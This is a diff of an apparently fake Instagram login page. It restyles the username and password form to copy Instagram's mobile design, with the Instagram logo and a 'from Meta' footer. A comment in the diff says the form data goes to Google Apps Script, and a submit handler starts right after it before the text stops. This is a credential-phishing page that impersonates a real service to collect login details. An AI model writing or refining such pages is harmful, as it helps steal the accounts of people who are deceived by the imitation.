@@ -4,72 +4,115 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    h1 {
-      font-family: 'Pacifico', cursive;
-      color: #333;
-      }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Segoe UI', sans-serif; background-color: #fafafa; }
-    .wrapper { display: flex; min-height: 100vh; flex-direction: row; }
-    .left {
-      flex: 1;
-      background-image: url("instagram-web-lox-image.png");
-      background-size: cover;
-      background-position: center;
-    }
-    .right {
-      flex: 1;
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to bottom, #1a1a2e, #16213e);
+      color: white;
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
-      padding: 40px;
+      padding-top: 40px;
     }
-    .right h1 { font-size: 32px; margin-bottom: 24px; }
-    .form { width: 100%; max-width: 320px; }
-    .form input {
-      width: 100%; margin: 8px 0; padding: 12px;
-      border: 1px solid #dbdbdb; border-radius: 4px;
-      font-size: 14px; background-color: #fff;
+
+    .language {
+      color: #bbb;
+      font-size: 14px;
+      margin-bottom: 20px;
     }
-    .form button {
-      width: 100%; padding: 12px;
-      background-color: #0095f6; color: white; border: none;
-      font-weight: bold; border-radius: 4px;
-      margin-top: 12px; cursor: pointer;
+
+    .logo {
+      width: 60px;
+      height: 60px;
+      margin: 20px 0;
     }
-    .form button:hover { background-color: #007cd1; }
-    .bottom-text {
-      margin-top: 20px; font-size: 13px;
-      color: #8e8e8e; text-align: center;
+
+    form {
+      display: flex;
+      flex-direction: column;
+      width: 90%;
+      max-width: 320px;
     }
-    @media (max-width: 768px) {
-      .wrapper { flex-direction: column; }
-      .left { height: 300px; }
-      .right { padding: 20px; }
+
+    input {
+      background: #2a2a3d;
+      border: 1px solid #444;
+      color: white;
+      border-radius: 6px;
+      padding: 14px;
+      margin: 8px 0;
+      font-size: 14px;
+    }
+
+    button {
+      background-color: #1877f2;
+      border: none;
+      border-radius: 6px;
+      padding: 14px;
+      color: white;
+      font-weight: bold;
+      font-size: 15px;
+      margin-top: 12px;
+      cursor: pointer;
+    }
+
+    .forgot {
+      color: #ddd;
+      font-size: 14px;
+      margin: 16px 0;
+      text-align: center;
+    }
+
+    .create {
+      border: 1px solid #1877f2;
+      color: #1877f2;
+      background: transparent;
+      padding: 12px;
+      border-radius: 6px;
+      font-weight: 600;
+      margin-top: 10px;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    .meta-logo {
+      width: 50px;
+      margin-top: 8px;
+    }
+
+    @media (min-width: 600px) {
+      body {
+        justify-content: center;
+        height: 100vh;
+        padding-top: 0;
+      }
     }
   </style>
 </head>
 <body>
-      <img class="xz74otr x15mokao x1ga7v0g x16uus16 xbiv7yw x4pkz1m x14m272y x14atkfc" alt="" referrerpolicy="origin-when-cross-origin" src="/images/instagram/xig/homepage/screenshots_v3/instagram-web-lox-image.png">
+  <div class="language">English (UK)</div>
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
 
-  <div class="wrapper">
-    <div class="left"></div>
-    <div class="right">
-      <h1>Instagram</h1>
-      <form class="form" id="login-form">
-        <input name="username" type="text" placeholder="Username or Email" required />
-        <input name="password" type="password" placeholder="Password" required />
-        <button type="submit">Log In</button>
-      </form>
-      <div class="bottom-text">
-        Don’t have an account? <a href="#">Sign up</a>
-      </div>
-    </div>
+  <form id="login-form">
+    <input type="text" name="username" placeholder="Username, email address or mobile ..." required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit">Log in</button>
+  </form>
+
+  <div class="forgot">Forgotten password?</div>
+  <button class="create">Create new account</button>
+
+  <div class="footer">
+    <div>from</div>
+    <img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo.svg" alt="Meta Logo">
   </div>
 
-  <!-- JS to send form data to Google Apps Script -->
   <script>
     const form = document.getElementById('login-form');
     form.addEventListener('submit', function(e) {
